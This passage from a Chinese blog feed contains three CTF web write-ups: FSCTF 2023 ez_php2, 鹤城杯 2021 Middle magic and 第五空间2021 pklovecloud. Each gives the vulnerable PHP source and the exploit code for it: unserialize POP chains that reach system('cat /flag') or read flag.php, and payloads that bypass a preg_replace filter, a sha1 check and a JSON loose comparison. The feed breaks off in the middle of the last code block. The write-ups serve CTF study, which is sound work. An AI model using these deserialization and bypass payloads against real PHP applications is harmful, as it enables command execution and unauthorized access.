      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【FSCTF 2023】ez_php2</title>
    <link href="/2024/08/10/%5BFSCTF%202023%5Dez_php2/"/>
    <url>/2024/08/10/%5BFSCTF%202023%5Dez_php2/</url>
    
    <content type="html"><![CDATA[<p>源码奉上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>Class Rd&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ending</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cl</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;All matters have concluded&quot;</span>;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;ending);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arg</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arg</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;<span class="hljs-variable">$value</span>)<br>        &#123;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;POC&#x27;</span>]==<span class="hljs-string">&quot;1111&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="hljs-string">&quot;system&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payload</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;payload = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"><span class="hljs-variable">$paylaod</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$paylaod</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Er</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$symbol</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;symbol = True;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$value</span>(<span class="hljs-variable language_">$this</span>-&gt;Flag);<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;start1.<span class="hljs-string">&quot;__construct&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start2===<span class="hljs-string">&quot;11111&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;start1-&gt;<span class="hljs-title function_ invoke__">Love</span>(<span class="hljs-variable">$this</span>-&gt;start);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are Good!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Ha_rde_r&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Ha_rde_r&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You are Silly goose!&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>代码审计构造pop链</strong><br><code>Ha_destruct-&gt;Rd_call-&gt;Er_set</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Class Rd&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ending</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cl</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Er</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$symbol</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Flag</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;POC&quot;</span>=&gt;<span class="hljs-string">&quot;1111&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start2</span>=<span class="hljs-string">&quot;11111&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ha</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Er</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rd</span>();<br><span class="hljs-variable">$a</span>-&gt;start1 = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;start1-&gt;cl = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【鹤城杯 2021】Middle magic</title>
    <link href="/2024/08/10/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic/"/>
    <url>/2024/08/10/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;<br><br>  <span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]);<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, <span class="hljs-variable">$aaa</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-comment">// START FORM PROCESSING    </span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>          <span class="hljs-variable">$level_3</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$level_3</span>-&gt;result == <span class="hljs-variable">$result</span>) &#123;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.<span class="hljs-variable">$flag</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span>&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// perform validations on the form data</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>&#125;<br><br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这道题有三个if，分别是<br>1.第一个if要求<code>aaa=pass_the_level_1</code><br>2.第二个if要求传入两个不相等变量<code>admin</code>和<code>root_pwd</code>两者sha1加密后相等；<br>3.第三个if要求传入<code>level_3</code>，对其进行json解码之后，需要<code>$level_3-&gt;result == $result</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">json_decode</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$json</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$assoc</span> = <span class="hljs-literal">false</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$depth</span> = <span class="hljs-number">512</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span>]]] )<br><span class="hljs-comment">//json_decode接受一个JSON格式的字符串并且把它转换为PHP变量,当该参数assoc为TRUE时，将返回array，否则返回object。</span><br></code></pre></td></tr></table></figure><p><strong>第一个if</strong><br>因为preg_replace函数只能匹配一行的数据，因此我们只需先传入换行符，那么后面的传入便不再被匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?aaa=%<span class="hljs-number">0</span>apass_the_level_1%<span class="hljs-number">23</span><br><span class="hljs-comment">//这里解释一下%23，这是＃的url编码，直接传入#是不行的，浏览器会将它视作url的指示符号，可以去了解一下url的构成就能理解了（个人的理解，轻点喷）</span><br></code></pre></td></tr></table></figure><p><strong>第二个if</strong><br>直接用数组绕过，sha1加密时，若传入的是数组，返回值为null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">admin[]=<span class="hljs-number">1</span>&amp;root_pwd[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>第三个if</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">level_3=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-subst">$result</span>&quot;</span>&#125;<br><span class="hljs-comment">//其他师傅的</span><br>level_3=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>&#125;<br><span class="hljs-comment">//php弱比较在面对纯字符与0的比较时，会返回true，例如&#x27;abc&#x27; == 0返回为true</span><br><span class="hljs-comment">//推测$result是纯字符，因此构造result-&gt;0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第五空间2021---pklovecloud</title>
    <link href="/2024/08/07/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021---pklovecloud/"/>
    <url>/2024/08/07/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021---pklovecloud/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pkshow</span> </span><br><span class="hljs-class"></span>&#123;  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)     </span><br><span class="hljs-function">  </span>&#123;          <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Pk very safe^.^&quot;</span>;      <br>  &#125;  <br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span> </span><br><span class="hljs-class"></span>&#123;   <br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;  <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">  </span>&#123;      <br>    <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> pkshow;<br>  &#125;  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">  </span>&#123;          <br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;cinder))  <br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cinder-&gt;<span class="hljs-title function_ invoke__">echo_name</span>();      <br>  &#125;  <br>&#125;  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;    <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;     <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>; <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">  </span>&#123;   <br>    <span class="hljs-variable language_">$this</span>-&gt;openstack = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;docker);<br>    <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="hljs-variable">$heat</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;nova)<br>    &#123;<br>      <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;./<span class="hljs-subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>))         <br>      &#123;              <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>); <br>      &#125;  <br>      <span class="hljs-keyword">else</span> <br>      &#123; <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;keystone lost~&quot;</span>; <br>      &#125;    <br>    &#125;<br>  &#125;  <br>&#125;  <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]))  <br>&#123;<br>  <span class="hljs-variable">$logData</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$logData</span>; <br>&#125; <br><span class="hljs-keyword">else</span> <br>&#123; <br>  <span class="hljs-title function_ invoke__">highlight_file</span>(__file__); <br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>return file_get_contents($file);</code>代码审计可以发现唯一能利用的是这个函数<br>然后只能通过acp类触发<br>acp只能通过题目给的<code>echo $logData;</code>来触发</p><ul><li>第一个问题就是cinder是受保护的属性，所以不能直接在类外修改</li></ul><p>那么只能通过<code>__construct()</code> 来进行修改</p><ul><li>第二个问题是要进入循环则需要强比较neutron和nova，这里有两个可行的方法</li></ul><p>1.给docker赋值成一个序列化的字符串<br>2.别管docker，它就本身就是一个null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> ace;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">acp</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//记得url编码</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> ace;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>=<span 